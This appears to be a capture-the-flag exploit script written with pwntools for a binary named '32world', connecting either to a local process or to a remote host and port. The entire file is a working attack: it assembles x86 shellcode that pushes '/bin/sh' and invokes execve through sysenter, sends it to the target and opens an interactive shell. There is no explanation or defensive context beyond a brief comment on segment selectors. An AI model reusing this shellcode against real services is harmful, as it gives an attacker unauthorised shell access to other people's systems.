from pwn import *
import sys, time

if len(sys.argv) == 1:
    p = process(["./32world"])

else:
    p = remote("54.65.133.244", "8361")

context.binary = "./32world"


# x86 -> 0x23
# x64 -> 0x33
# sysenter vs syscall

code = asm('''
        push 0x68732f
        push 0x6e69622f
        mov ebx, esp
        mov al, 0xb
        mov ebp, esp
        sysenter
        ''')

p.sendline(code)

p.interactive()
